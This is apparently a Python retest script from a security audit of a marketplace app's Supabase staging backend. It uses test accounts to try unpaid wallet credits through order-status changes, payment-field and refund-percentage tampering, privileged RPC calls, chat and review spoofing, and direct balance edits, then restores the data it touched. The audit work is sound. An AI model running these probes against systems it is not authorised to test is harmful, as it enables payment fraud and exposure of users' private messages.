# Independent retest of THIS auditor's P0/P1 findings. JWT buyer/seller only for attacks.
# service_role: observe hidden cols if needed + cleanup of disposable fixtures.
import json, ssl, time, uuid, urllib.request, urllib.error
from pathlib import Path

ENV_PATH = Path(r"c:\Users\Casa\Desktop\Fleaber\fleaber\tool\live_ops_staging.env")
OUT_PATH = Path(r"c:\Users\Casa\Desktop\Fleaber\fleaber\tool\reports\RETESTE_INDEP_P0P1_2026-08-27.json")
BASE = "https://fxdknzrqjenzqcvnwqqq.supabase.co"
ctx = ssl.create_default_context()

env = {}
for line in ENV_PATH.read_text(encoding="utf-8").splitlines():
    line = line.strip()
    if not line or line.startswith("#") or "=" not in line:
        continue
    k, v = line.split("=", 1)
    env[k.strip()] = v.strip()

ANON = env["SUPABASE_ANON_KEY"]
SVC = env["SUPABASE_SERVICE_ROLE_KEY"]
TAG = f"RT-{int(time.time())}"

def http(method, url, token, body=None, prefer="return=representation"):
    data = None if body is None else json.dumps(body).encode()
    h = {"apikey": ANON, "Authorization": f"Bearer {token}"}
    if prefer:
        h["Prefer"] = prefer
    if data is not None:
        h["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=45) as resp:
            raw = resp.read().decode("utf-8", "replace")
            return resp.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        return e.code, raw

def rest(method, path, token, qs="", body=None):
    url = f"{BASE}/rest/v1/{path}"
    if qs:
        url += "?" + qs
    return http(method, url, token, body)

def rpc(name, token, args):
    return rest("POST", f"rpc/{name}", token, body=args)

def auth(email, password):
    st, raw = http("POST", f"{BASE}/auth/v1/token?grant_type=password", ANON, {"email": email, "password": password}, prefer=None)
    j = json.loads(raw)
    return j["access_token"], j["user"]["id"]

def jload(raw):
    try:
        return json.loads(raw)
    except Exception:
        return raw

def first(raw):
    o = jload(raw)
    if isinstance(o, list) and o:
        return o[0]
    if isinstance(o, dict):
        return o
    return {}

def bal(token, uid):
    st, raw = rest("GET", "wallets", token, f"id=eq.{uid}&select=id,balance")
    row = first(raw)
    try:
        return float(row.get("balance"))
    except Exception:
        return None

findings = []

def rec(tid, **kw):
    row = {"id": tid, **kw}
    findings.append(row)
    detail = str(kw.get("detail", ""))[:220].replace("\n", " ")
    print(f"[{tid}] {kw.get('verdict','?')} {detail}")

BT, BID = auth(env["LIVE_OPS_TEST_BUYER_EMAIL"], env["LIVE_OPS_TEST_BUYER_PASSWORD"])
ST, SID = auth(env["LIVE_OPS_TEST_SELLER_EMAIL"], env["LIVE_OPS_TEST_SELLER_PASSWORD"])
W0B = bal(BT, BID)
W0S = bal(ST, SID)
rec("SETUP", verdict="INFO", detail=f"buyer={BID} seller={SID} w0b={W0B} w0s={W0S}")

created = {"products": [], "orders": [], "chats": [], "reviews": [], "disputes": [], "live_items": [], "reservations": []}

# --- product fixture ---
st, raw = rest("POST", "products", ST, body={
    "seller_id": SID,
    "title": f"RETESTE-INDEP-{TAG}",
    "price": 1.00,
    "quantity": 5,
    "list_on_marketplace": False,
    "available_for_live": False,
    "is_sold": False,
})
prod = first(raw)
PID = prod.get("id")
created["products"].append(PID)
rec("FX_PRODUCT", verdict="OK" if PID else "FAIL", detail=f"http={st} pid={PID} qty={prod.get('quantity')}")

def new_order(token, extra):
    body = {
        "buyer_id": BID,
        "seller_id": SID,
        "product_id": PID,
        "quantity": 1,
        "price_total": 2.00,
        "status": "reserva_pendente",
        "payment_method": "MB WAY",
        "shipping_method": "Levantamento em mao",
    }
    body.update(extra)
    st, raw = rest("POST", "orders", token, body=body)
    row = first(raw)
    oid = row.get("id")
    if oid:
        created["orders"].append(oid)
    return st, row, raw

def patch_order(token, oid, body):
    return rest("PATCH", "orders", token, f"id=eq.{oid}", body)

# =====================================================================
# P0-01 original + variants
# =====================================================================
st, row, raw = new_order(BT, {"price_total": 2.00})
oid_a = row.get("id")
st, raw = patch_order(ST, oid_a, {"status": "pago"})
row = first(raw)
st, raw = patch_order(ST, oid_a, {"status": "devolvida"})
row = first(raw)
w1 = bal(BT, BID)
mint_a = (w1 is not None and W0B is not None and abs(w1 - W0B) > 0.001)
rec("P0_01_seller_pago_devolvida", verdict="EXPLOITABLE" if mint_a else "BLOCKED",
    detail=f"status={row.get('status')} refund_at={row.get('wallet_refund_processed_at')} w {W0B}->{w1} amount_paid={row.get('amount_paid_cents')}")

# retry / repeat devolvida
st, raw = patch_order(ST, oid_a, {"status": "devolvida"})
w1b = bal(BT, BID)
rec("P0_01_retry_devolvida", verdict="DOUBLE" if (w1b is not None and w1 is not None and abs(w1b-w1)>0.001) else "NO_DOUBLE",
    detail=f"w {w1}->{w1b} http={st}")

# pago -> concluido -> review
st, row, raw = new_order(BT, {"price_total": 3.00})
oid_b = row.get("id")
patch_order(ST, oid_b, {"status": "pago"})
st, raw = patch_order(BT, oid_b, {"status": "concluido"})
row = first(raw)
st_rev, raw_rev = rest("POST", "reviews", BT, body={
    "order_id": oid_b, "buyer_id": BID, "target_id": SID, "target_type": "seller",
    "stars": 5, "author_role": "comprador", "comment": f"reteste-{TAG}",
})
if first(raw_rev).get("id"):
    created["reviews"].append(first(raw_rev).get("id"))
w2s = bal(ST, SID)
mint_b = (w2s is not None and W0S is not None and abs(w2s - W0S) > 0.001)
rec("P0_01_pago_concluido_review", verdict="EXPLOITABLE" if mint_b else "BLOCKED",
    detail=f"conc_http={st} conc_status={row.get('status')} rev_http={st_rev} w_seller {W0S}->{w2s} release={row.get('wallet_release_processed_at')}")

# buyer-only: try all status jumps without seller
st, row, raw = new_order(BT, {"price_total": 50.00})
oid_c = row.get("id")
for sname in ["pago", "concluido", "devolvida", "enviado"]:
    st, raw = patch_order(BT, oid_c, {"status": sname})
    got = first(raw).get("status")
    rec(f"P0_01_buyer_alone_{sname}", verdict="EXPLOITABLE" if got == sname else "BLOCKED",
        detail=f"wanted={sname} got={got} http={st}")
w3 = bal(BT, BID)
rec("P0_01_buyer_alone_wallet", verdict="EXPLOITABLE" if (w3 is not None and W0B is not None and abs(w3-(w1 if w1 is not None else W0B))>0.5 and abs(w3-W0B)>0.5 and mint_a is False and abs(w3-W0B)>0.001) else "NO_MINT",
    detail=f"w {W0B}->{w3}")

# seller-only: insert as seller with self as buyer? can't be both easily.
# seller insert order with buyer=BID (allowed by insert parties if seller_id=uid)
st, row, raw = new_order(ST, {"price_total": 40.00, "buyer_id": BID})
oid_d = row.get("id")
patch_order(ST, oid_d, {"status": "pago"})
st, raw = patch_order(ST, oid_d, {"status": "devolvida"})
w4 = bal(BT, BID)
rec("P0_01_seller_insert_and_devolvida", verdict="INFO",
    detail=f"oid={oid_d} status={first(raw).get('status')} buyer_w={w4}")

# high price_total
st, row, raw = new_order(BT, {"price_total": 9999.99})
oid_hi = row.get("id")
rec("P1_03_insert_high_price", verdict="CLIENT_PRICE_KEPT" if abs(float(row.get("price_total") or 0)-9999.99)<0.01 else "STRIPPED",
    detail=f"status={row.get('status')} price={row.get('price_total')} paid_cents={row.get('amount_paid_cents')} pi={row.get('stripe_payment_intent_id')}")
patch_order(ST, oid_hi, {"status": "pago"})
st, raw = patch_order(ST, oid_hi, {"status": "devolvida"})
w_hi = bal(BT, BID)
hi_mint = w_hi is not None and W0B is not None and (w_hi - (w1 if mint_a else W0B)) > 100
rec("P0_01_high_price_devolvida", verdict="EXPLOITABLE" if (w_hi is not None and W0B is not None and abs(w_hi-W0B) > 50) else "BLOCKED",
    detail=f"w {W0B}->{w_hi} status={first(raw).get('status')}")

# qty manipulation
st, row, raw = new_order(BT, {"quantity": 99, "price_total": 99.00})
oid_q = row.get("id")
rec("P1_03_insert_qty99", verdict="KEPT" if row.get("quantity") == 99 else "CLAMPED",
    detail=f"qty={row.get('quantity')} price={row.get('price_total')}")
st, raw = patch_order(BT, oid_q, {"quantity": 500})
rec("P1_03_patch_qty_prepay", verdict="KEPT" if first(raw).get("quantity") == 500 else "BLOCKED_OR_UNCHANGED",
    detail=f"qty={first(raw).get('quantity')} http={st}")

# amount_paid_cents write attempts
st, row, raw = new_order(BT, {"price_total": 12.34, "amount_paid_cents": 123400, "stripe_payment_intent_id": "pi_fake_reteste", "status": "pago"})
rec("AUTH_insert_paid_cents", verdict="STRIPPED" if not row.get("amount_paid_cents") else "WRITTEN",
    detail=f"status={row.get('status')} paid={row.get('amount_paid_cents')} pi={row.get('stripe_payment_intent_id')} price={row.get('price_total')}")
oid_ap = row.get("id")
st, raw = patch_order(BT, oid_ap, {"amount_paid_cents": 123400})
rec("AUTH_buyer_patch_paid_cents", verdict="WRITTEN" if first(raw).get("amount_paid_cents") else "BLOCKED",
    detail=f"http={st} paid={first(raw).get('amount_paid_cents')}")
st, raw = patch_order(ST, oid_ap, {"amount_paid_cents": 123400, "status": "pago"})
rec("AUTH_seller_patch_paid_cents", verdict="WRITTEN" if first(raw).get("amount_paid_cents") else "BLOCKED",
    detail=f"http={st} status={first(raw).get('status')} paid={first(raw).get('amount_paid_cents')}")

# after fake pago, try patch paid cents then devolvida
st, row, raw = new_order(BT, {"price_total": 20.00})
oid_ap2 = row.get("id")
patch_order(ST, oid_ap2, {"status": "pago"})
st, raw = patch_order(ST, oid_ap2, {"amount_paid_cents": 2000})
paid_set = first(raw).get("amount_paid_cents")
st, raw = patch_order(ST, oid_ap2, {"status": "devolvida"})
w_ap = bal(BT, BID)
rec("AUTH_pago_then_write_cents_devolvida", verdict="EXPLOITABLE" if (w_ap is not None and W0B is not None and abs(w_ap-W0B)>1 and paid_set) else "BLOCKED",
    detail=f"paid_set={paid_set} w {W0B}->{w_ap} status={first(raw).get('status')}")

# credit_wallet_once / other RPCs
st, raw = rpc("batata_credit_wallet_once", BT, {
    "p_wallet_id": BID, "p_order_id": oid_a, "p_amount": 50, "p_type": "reembolso", "p_description": "x"
})
rec("RPC_credit_wallet_once", verdict="EXPOSED" if st < 400 else "HIDDEN_OR_DENIED", detail=f"http={st} {raw[:160]}")
st, raw = rpc("batata_refund_buyer_wallet_for_order", BT, {"p_order_id": oid_a})
rec("RPC_refund_buyer", verdict="INFO", detail=f"http={st} {raw[:160]}")
st, raw = rpc("batata_release_seller_wallet_for_order", BT, {"p_order_id": oid_b})
rec("RPC_release_seller", verdict="INFO", detail=f"http={st} {raw[:160]}")
st, raw = rpc("batata_admin_resolve_dispute", BT, {"p_dispute_id": str(uuid.uuid4()), "p_resolution": "refund"})
rec("RPC_admin_resolve", verdict="INFO", detail=f"http={st} {raw[:160]}")
st, raw = rpc("batata_wallet_apply_tip_once", BT, {"p_wallet_id": BID, "p_tip_id": str(uuid.uuid4()), "p_amount": 10, "p_type": "gorjeta_recebida", "p_description": "x"})
rec("RPC_tip_apply", verdict="INFO", detail=f"http={st} {raw[:160]}")

# pago -> enviado -> concluido -> review (variant)
st, row, raw = new_order(BT, {"price_total": 4.00})
oid_e = row.get("id")
patch_order(ST, oid_e, {"status": "pago"})
patch_order(ST, oid_e, {"status": "enviado"})
st, raw = patch_order(BT, oid_e, {"status": "concluido"})
st_rev2, raw_rev2 = rest("POST", "reviews", BT, body={
    "order_id": oid_e, "buyer_id": BID, "target_id": SID, "stars": 5, "author_role": "comprador", "comment": f"rt2-{TAG}",
})
if first(raw_rev2).get("id"):
    created["reviews"].append(first(raw_rev2).get("id"))
w5s = bal(ST, SID)
rec("P0_01_enviado_concluido_review", verdict="EXPLOITABLE" if (w5s is not None and W0S is not None and abs(w5s-W0S)>0.001) else "BLOCKED",
    detail=f"rev_http={st_rev2} w_s {W0S}->{w5s} {raw_rev2[:120]}")

# ping-pong pago/devolvida
st, row, raw = new_order(BT, {"price_total": 5.00})
oid_f = row.get("id")
patch_order(ST, oid_f, {"status": "pago"})
patch_order(ST, oid_f, {"status": "devolvida"})
st, raw = patch_order(ST, oid_f, {"status": "pago"})
rec("P0_01_devolvida_then_pago_again", verdict="INFO", detail=f"http={st} status={first(raw).get('status')} stock={first(raw).get('stock_units_applied')}")
st, raw = patch_order(ST, oid_f, {"status": "devolvida"})
w6 = bal(BT, BID)
rec("P0_01_second_devolvida", verdict="INFO", detail=f"w {W0B}->{w6} status={first(raw).get('status')}")

# =====================================================================
# P0-02 dispute percent
# =====================================================================
st, row, raw = new_order(BT, {"price_total": 7.77})
oid_g = row.get("id")
patch_order(ST, oid_g, {"status": "pago"})
patch_order(BT, oid_g, {"status": "concluido"})
st, raw = rest("POST", "order_disputes", BT, body={
    "order_id": oid_g, "buyer_id": BID, "reason": "outro", "description": f"rt-{TAG}",
    "seller_refund_percent": 100, "seller_offer_type": "partial_refund",
})
disp = first(raw)
if disp.get("id"):
    created["disputes"].append(disp.get("id"))
rec("P0_02_buyer_insert_percent", verdict="STRIPPED" if not disp.get("seller_refund_percent") else "WRITTEN",
    detail=f"http={st} pct={disp.get('seller_refund_percent')} type={disp.get('seller_offer_type')} set_by={disp.get('seller_offer_set_by')}")
did = disp.get("id")
if did:
    st, raw = rest("PATCH", "order_disputes", BT, f"id=eq.{did}", {
        "seller_refund_percent": 100, "seller_offer_type": "partial_refund",
    })
    rec("P0_02_buyer_patch_percent", verdict="WRITTEN" if first(raw).get("seller_refund_percent") else "BLOCKED",
        detail=f"http={st} pct={first(raw).get('seller_refund_percent')} set_by={first(raw).get('seller_offer_set_by')}")

w_before_rpc = bal(BT, BID)
st, raw = rpc("batata_process_partial_refund_dispute", BT, {"p_order_id": oid_g, "p_refund_percent": 100})
w_after_rpc = bal(BT, BID)
rpc_mint = w_after_rpc is not None and w_before_rpc is not None and abs(w_after_rpc - w_before_rpc) > 0.001
rec("P0_02_rpc_after_buyer_offer", verdict="EXPLOITABLE" if rpc_mint else "BLOCKED",
    detail=f"http={st} body={raw[:180]} w {w_before_rpc}->{w_after_rpc}")

# seller sets legitimate offer on unfunded order, buyer calls RPC
st, row, raw = new_order(BT, {"price_total": 8.88})
oid_h = row.get("id")
patch_order(ST, oid_h, {"status": "pago"})
patch_order(BT, oid_h, {"status": "concluido"})
st, raw = rest("POST", "order_disputes", BT, body={
    "order_id": oid_h, "buyer_id": BID, "reason": "outro", "description": f"rt2-{TAG}",
})
disp2 = first(raw)
if disp2.get("id"):
    created["disputes"].append(disp2.get("id"))
    st, raw = rest("PATCH", "order_disputes", ST, f"id=eq.{disp2['id']}", {
        "seller_refund_percent": 100, "seller_offer_type": "partial_refund",
    })
    rec("P0_02_seller_sets_offer_unfunded", verdict="INFO",
        detail=f"http={st} pct={first(raw).get('seller_refund_percent')} set_by={first(raw).get('seller_offer_set_by')}")
w_b2 = bal(BT, BID)
st, raw = rpc("batata_process_partial_refund_dispute", BT, {"p_order_id": oid_h, "p_refund_percent": 1})
w_a2 = bal(BT, BID)
rec("P0_02_rpc_seller_offer_unfunded", verdict="EXPLOITABLE" if (w_a2 is not None and w_b2 is not None and abs(w_a2-w_b2)>0.001) else "BLOCKED",
    detail=f"http={st} body={raw[:200]} w {w_b2}->{w_a2}")

# retry same RPC
st, raw = rpc("batata_process_partial_refund_dispute", BT, {"p_order_id": oid_h, "p_refund_percent": 100})
rec("P0_02_rpc_retry", verdict="INFO", detail=f"http={st} {raw[:160]}")

# =====================================================================
# P1-01 chats
# =====================================================================
st, raw = rest("GET", "chats", BT, f"select=id,user_a,user_b&or=(and(user_a.neq.{BID},user_b.neq.{BID}))&limit=5")
foreign_chats = jload(raw) if isinstance(jload(raw), list) else []
rec("P1_01_stranger_select_chats", verdict="OPEN" if foreign_chats else "CLOSED",
    detail=f"http={st} n={len(foreign_chats) if isinstance(foreign_chats,list) else 'err'} sample={str(foreign_chats)[:160]}")

st, raw = rest("GET", "chat_messages", BT, f"select=id,chat_id,sender_id,text&sender_id=neq.{BID}&limit=5")
foreign_msgs = jload(raw) if isinstance(jload(raw), list) else []
rec("P1_01_stranger_select_msgs", verdict="OPEN" if foreign_msgs else "CLOSED",
    detail=f"http={st} n={len(foreign_msgs) if isinstance(foreign_msgs,list) else 'err'} sample={str(foreign_msgs)[:160]}")

# spoof insert on known foreign chat if any, else dummy uuid
foreign_chat_id = None
if isinstance(foreign_chats, list) and foreign_chats:
    foreign_chat_id = foreign_chats[0].get("id")
elif isinstance(foreign_msgs, list) and foreign_msgs:
    foreign_chat_id = foreign_msgs[0].get("chat_id")
else:
    foreign_chat_id = "fa1a3f99-03b8-40fc-a923-7964a6dad586"

st, raw = rest("POST", "chat_messages", BT, body={
    "chat_id": foreign_chat_id, "sender_id": SID, "receiver_id": BID, "text": f"spoof-{TAG}",
})
spoof_row = first(raw)
rec("P1_01_spoof_sender_foreign_chat", verdict="OPEN" if st in (200, 201) else "CLOSED",
    detail=f"http={st} sender={spoof_row.get('sender_id')} id={spoof_row.get('id')} {raw[:140]}")
if spoof_row.get("id"):
    # cleanup spoof if we created it
    rest("DELETE", "chat_messages", BT, f"id=eq.{spoof_row['id']}")

# insert into own new chat then spoof
st, raw = rest("POST", "chats", BT, body={"user_a": BID, "user_b": SID})
own_chat = first(raw).get("id")
if own_chat:
    created["chats"].append(own_chat)
st, raw = rest("POST", "chat_messages", BT, body={
    "chat_id": own_chat, "sender_id": SID, "text": f"spoof-own-{TAG}",
})
sr = first(raw)
rec("P1_01_spoof_sender_own_chat", verdict="SPOOFED" if sr.get("sender_id") == SID else ("FORCED_SELF" if sr.get("sender_id")==BID else "CLOSED"),
    detail=f"http={st} sender={sr.get('sender_id')} {raw[:140]}")
if sr.get("id"):
    rest("DELETE", "chat_messages", BT, f"id=eq.{sr['id']}")

# UPDATE foreign message
if isinstance(foreign_msgs, list) and foreign_msgs:
    fid = foreign_msgs[0].get("id")
    st, raw = rest("PATCH", "chat_messages", BT, f"id=eq.{fid}", {"text": "hacked"})
    rec("P1_01_patch_foreign_msg", verdict="OPEN" if first(raw).get("text")=="hacked" else "CLOSED",
        detail=f"http={st} {raw[:120]}")

# OR-bypass: insert chat claiming to be both parties from stranger? already buyer.
st, raw = rest("POST", "chats", BT, body={"user_a": SID, "user_b": "69104e91-6a00-40d9-a7c9-b1571422ae43"})
rec("P1_01_insert_chat_neither_self", verdict="OPEN" if st in (200,201) else "CLOSED",
    detail=f"http={st} {raw[:140]}")

# =====================================================================
# P1-02 reviews
# =====================================================================
st, raw = rest("GET", "reviews", BT, f"select=id,order_id,buyer_id,stars&buyer_id=neq.{BID}&limit=5")
foreign_revs = jload(raw) if isinstance(jload(raw), list) else []
rec("P1_02_select_others", verdict="OPEN" if foreign_revs else "CLOSED",
    detail=f"http={st} n={len(foreign_revs) if isinstance(foreign_revs,list) else 'err'}")

other_oid = None
if isinstance(foreign_revs, list) and foreign_revs:
    other_oid = foreign_revs[0].get("order_id")
st, raw = rest("POST", "reviews", BT, body={
    "order_id": other_oid or "d0972f17-ea2d-4457-a4ad-f720aec3f54b",
    "buyer_id": BID, "target_id": SID, "stars": 5, "author_role": "comprador", "comment": f"spoof-rev-{TAG}",
})
rec("P1_02_insert_other_order", verdict="OPEN" if st in (200,201) else "CLOSED",
    detail=f"http={st} {raw[:180]}")
if first(raw).get("id"):
    created["reviews"].append(first(raw).get("id"))
    rest("DELETE", "reviews", BT, f"id=eq.{first(raw)['id']}")

# review without valid purchase (reserva)
st, row, raw = new_order(BT, {"price_total": 1.00})
oid_r = row.get("id")
st, raw = rest("POST", "reviews", BT, body={
    "order_id": oid_r, "buyer_id": BID, "target_id": SID, "stars": 5, "author_role": "comprador", "comment": "no-purchase",
})
rec("P1_02_review_unpaid_order", verdict="OPEN" if st in (200,201) else "CLOSED",
    detail=f"http={st} {raw[:160]}")

# duplicate review on oid_b if review existed
st, raw = rest("POST", "reviews", BT, body={
    "order_id": oid_b, "buyer_id": BID, "target_id": SID, "stars": 5, "author_role": "comprador", "comment": "dup",
})
rec("P1_02_duplicate_review", verdict="OPEN" if st in (200,201) else "CLOSED",
    detail=f"http={st} {raw[:160]}")

# spoof target/buyer
st, raw = rest("POST", "reviews", BT, body={
    "order_id": oid_e, "buyer_id": SID, "target_id": BID, "stars": 1, "author_role": "comprador", "comment": "spoof-ids",
})
rec("P1_02_spoof_buyer_target", verdict="OPEN" if st in (200,201) else "CLOSED",
    detail=f"http={st} buyer={first(raw).get('buyer_id')} target={first(raw).get('target_id')} {raw[:120]}")

# =====================================================================
# P1-04 stock
# =====================================================================
st, raw = rest("GET", "products", ST, f"id=eq.{PID}&select=id,quantity")
qty_start = first(raw).get("quantity")
st, row, raw = new_order(BT, {"price_total": 1.00, "quantity": 1})
oid_st = row.get("id")
st, raw = patch_order(ST, oid_st, {"status": "pago"})
pago_row = first(raw)
st, raw = rest("GET", "products", ST, f"id=eq.{PID}&select=id,quantity")
qty_pago = first(raw).get("quantity")
st, raw = patch_order(ST, oid_st, {"status": "devolvida"})
st, raw = rest("GET", "products", ST, f"id=eq.{PID}&select=id,quantity")
qty_dev = first(raw).get("quantity")
rec("P1_04_pago_devolvida_stock", verdict="RESTORED" if qty_dev == qty_start else ("CONSUMED_NO_RESTORE" if qty_dev is not None and qty_start is not None and qty_dev < qty_start else "INFO"),
    detail=f"qty {qty_start} -> pago {qty_pago} applied={pago_row.get('stock_units_applied')} -> devolvida {qty_dev}")

# retry devolvida should not double restore
st, raw = patch_order(ST, oid_st, {"status": "devolvida"})
st, raw = rest("GET", "products", ST, f"id=eq.{PID}&select=id,quantity")
qty_dev2 = first(raw).get("quantity")
rec("P1_04_double_restore", verdict="DOUBLE" if qty_dev2 is not None and qty_dev is not None and qty_dev2 > qty_dev else "NO_DOUBLE",
    detail=f"qty after 2nd devolvida={qty_dev2}")

# pago/devolvida/pago
st, row, raw = new_order(BT, {"quantity": 1, "price_total": 1.00})
oid_st2 = row.get("id")
patch_order(ST, oid_st2, {"status": "pago"})
st, raw = rest("GET", "products", ST, f"id=eq.{PID}&select=quantity")
q1 = first(raw).get("quantity")
patch_order(ST, oid_st2, {"status": "devolvida"})
st, raw = rest("GET", "products", ST, f"id=eq.{PID}&select=quantity")
q2 = first(raw).get("quantity")
st, raw = patch_order(ST, oid_st2, {"status": "pago"})
st, raw = rest("GET", "products", ST, f"id=eq.{PID}&select=quantity")
q3 = first(raw).get("quantity")
rec("P1_04_pago_dev_pago", verdict="INFO",
    detail=f"qty pago={q1} dev={q2} pago2_status={first(raw).get('status') if False else 'see'} after_second_pago={q3} patch_pago2={st}")

# negative / huge qty insert
st, row, raw = new_order(BT, {"quantity": -3, "price_total": 1.00})
rec("P1_03_negative_qty", verdict="INFO", detail=f"http={st} qty={row.get('quantity')} {str(row)[:100]}")
st, row, raw = new_order(BT, {"quantity": 0, "price_total": 1.00})
rec("P1_03_zero_qty", verdict="INFO", detail=f"http={st} qty={row.get('quantity')}")

# =====================================================================
# P1-05 live qty + accept
# =====================================================================
# product with qty 0
st, raw = rest("POST", "products", ST, body={
    "seller_id": SID, "title": f"RETESTE-ZERO-{TAG}", "price": 1.00, "quantity": 0,
    "list_on_marketplace": False, "available_for_live": True, "is_sold": False,
})
pz = first(raw)
PZ = pz.get("id")
if PZ:
    created["products"].append(PZ)
st, raw = rest("GET", "lives", ST, "select=id,status,seller_id&limit=5")
lives = jload(raw) if isinstance(jload(raw), list) else []
rec("P1_05_lives_list", verdict="INFO", detail=f"http={st} n={len(lives) if isinstance(lives,list) else 0}")
live_id = None
if isinstance(lives, list):
    for L in lives:
        if L.get("seller_id") == SID:
            live_id = L.get("id")
            break
    if not live_id and lives:
        live_id = lives[0].get("id")

if live_id and PZ:
    st, raw = rest("POST", "live_items", ST, body={
        "live_id": live_id, "item_kind": "marketplace_product", "product_id": PZ,
        "title": f"zero-{TAG}", "price": 1.00, "quantity": 0, "ref_code": f"Z{TAG[-6:]}",
        "status": "available",
    })
    li = first(raw)
    LI = li.get("id")
    rec("P1_05_create_live_item_qty0", verdict="INFO", detail=f"http={st} li={LI} {raw[:140]}")
    if LI:
        created["live_items"].append(LI)
        st, raw = rpc("batata_live_item_total_qty", ST, {"p_live_item_id": LI})
        rec("P1_05_rpc_total_qty_zero_product", verdict="PHANTOM_1" if str(raw).strip() in ("1", "1.0") else ("ZERO_OK" if str(raw).strip() in ("0", "0.0") else "INFO"),
            detail=f"http={st} body={raw[:80]}")
        # buyer reservation
        st, raw = rest("POST", "live_reservation_requests", BT, body={
            "live_id": live_id, "live_item_id": LI, "seller_id": SID, "buyer_id": BID,
            "requested_qty": 1, "status": "pending", "source": "fleaber_live",
        })
        rr = first(raw)
        RID = rr.get("id")
        rec("P1_05_insert_reservation_qty0", verdict="INFO", detail=f"http={st} rid={RID} {raw[:120]}")
        if RID:
            created["reservations"].append(RID)
            st, raw = rpc("batata_process_live_reservation_request", ST, {"p_request_id": RID, "p_action": "accept"})
            rec("P1_05_accept_when_stock0", verdict="ACCEPTED_BUG" if (st==200 and "no_stock" not in raw and "qty_exceeds" not in raw and '"ok": true' in raw.replace(" ","").lower().replace("true","true") and "no_stock" not in raw) else "INFO",
                detail=f"http={st} {raw[:220]}")
            # refine verdict
            body = jload(raw)
            ok = isinstance(body, dict) and body.get("ok") is True
            err = body.get("error") if isinstance(body, dict) else None
            rec("P1_05_accept_stock0_parsed", verdict="EXPLOITABLE" if ok else ("BLOCKED" if err in ("no_stock", "qty_exceeds_stock") else "INFO"),
                detail=f"ok={ok} error={err} body={raw[:180]}")
else:
    rec("P1_05_skip_no_live", verdict="SKIP", detail="no live_id or zero product")

# also call total_qty on existing marketplace live_item if any
st, raw = rest("GET", "live_items", ST, "select=id,item_kind,product_id,quantity&item_kind=eq.marketplace_product&limit=3")
items = jload(raw) if isinstance(jload(raw), list) else []
if isinstance(items, list):
    for it in items[:2]:
        st, raw = rpc("batata_live_item_total_qty", ST, {"p_live_item_id": it.get("id")})
        rec("P1_05_existing_item_qty", verdict="INFO", detail=f"li={it.get('id')} prod={it.get('product_id')} li_qty={it.get('quantity')} rpc={raw[:40]}")

# =====================================================================
# wallet direct + transactions
# =====================================================================
st, raw = rest("PATCH", "wallets", BT, f"id=eq.{BID}", {"balance": 9999})
rec("WALLET_patch_balance", verdict="BLOCKED" if (first(raw)=={} or st>=400 or first(raw).get("balance")!=9999) else "OPEN",
    detail=f"http={st} {raw[:120]}")
st, raw = rest("POST", "wallet_transactions", BT, body={
    "wallet_id": BID, "amount": 50, "type": "reembolso", "description": "forge", "order_id": oid_a,
})
rec("WALLET_insert_tx", verdict="OPEN" if st in (200,201) else "CLOSED", detail=f"http={st} {raw[:140]}")

# Observe via service: amount_paid on our orders (not an attack)
st, raw = rest("GET", "orders", SVC, f"id=eq.{oid_a}&select=id,status,amount_paid_cents,price_total,wallet_refund_processed_at,stock_units_applied")
rec("OBS_svc_order_a", verdict="INFO", detail=raw[:200])

# Legitimate-ish: buyer cannot self-pago still
# already recorded

# Final balances
WF_B = bal(BT, BID)
WF_S = bal(ST, SID)
rec("FINAL_BALANCES", verdict="INFO", detail=f"buyer {W0B}->{WF_B} seller {W0S}->{WF_S}")

# =====================================================================
# CLEANUP — revert wallets, delete disposable rows where RLS allows / svc
# =====================================================================
def cleanup():
    notes = []
    st, raw = rest("PATCH", "wallets", SVC, f"id=eq.{BID}", {"balance": W0B})
    notes.append(f"buyer_wallet http={st} ->{W0B}")
    st, raw = rest("PATCH", "wallets", SVC, f"id=eq.{SID}", {"balance": W0S})
    notes.append(f"seller_wallet http={st} ->{W0S}")
    for rid in created["reviews"]:
        if rid:
            rest("DELETE", "reviews", SVC, f"id=eq.{rid}")
    for did in created["disputes"]:
        if did:
            rest("DELETE", "order_disputes", SVC, f"id=eq.{did}")
    for oid in created["orders"]:
        if oid:
            rest("DELETE", "orders", SVC, f"id=eq.{oid}")
    for rid in created["reservations"]:
        if rid:
            rest("DELETE", "live_reservation_requests", SVC, f"id=eq.{rid}")
    for lid in created["live_items"]:
        if lid:
            rest("DELETE", "live_items", SVC, f"id=eq.{lid}")
    for pid in created["products"]:
        if pid:
            rest("DELETE", "products", SVC, f"id=eq.{pid}")
    for cid in created["chats"]:
        if cid:
            rest("DELETE", "chat_messages", SVC, f"chat_id=eq.{cid}")
            rest("DELETE", "chats", SVC, f"id=eq.{cid}")
    return notes

cnotes = cleanup()
rec("CLEANUP", verdict="DONE", detail="; ".join(cnotes))
st, raw = rest("GET", "wallets", BT, f"id=eq.{BID}&select=balance")
rec("CLEANUP_VERIFY_B", verdict="OK" if abs(float(first(raw).get("balance", -1))-W0B)<0.001 else "DRIFT",
    detail=raw)
st, raw = rest("GET", "wallets", ST, f"id=eq.{SID}&select=balance")
rec("CLEANUP_VERIFY_S", verdict="OK" if abs(float(first(raw).get("balance", -1))-W0S)<0.001 else "DRIFT",
    detail=raw)

payload = {
    "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    "buyer": BID, "seller": SID,
    "w0_buyer": W0B, "w0_seller": W0S,
    "created": created,
    "findings": findings,
}
OUT_PATH.write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
print("WROTE", OUT_PATH)
